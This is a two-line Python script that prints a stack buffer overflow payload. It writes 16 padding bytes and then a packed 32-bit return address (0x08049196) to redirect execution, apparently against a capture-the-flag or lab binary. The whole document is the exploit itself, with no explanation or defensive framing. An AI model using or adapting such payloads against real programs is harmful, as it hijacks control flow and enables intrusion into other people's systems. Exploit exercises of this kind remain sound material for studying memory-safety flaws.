import struct, sys;
sys.stdout.buffer.write(b'A'*16 + struct.pack('<I', 0x08049196))